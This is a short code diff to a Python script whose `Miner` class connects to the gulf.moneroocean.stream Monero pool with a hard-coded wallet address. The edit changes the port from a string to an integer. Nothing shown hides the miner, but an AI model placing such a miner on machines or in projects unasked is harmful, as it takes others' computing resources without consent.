@@ -157,7 +157,7 @@ class Miner(multiprocessing.Process):
 
 
 url = "gulf.moneroocean.stream"
-port = "10001"
+port = 10001
 user = "4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu"
 
 mnr  = Miner(url,port,user)
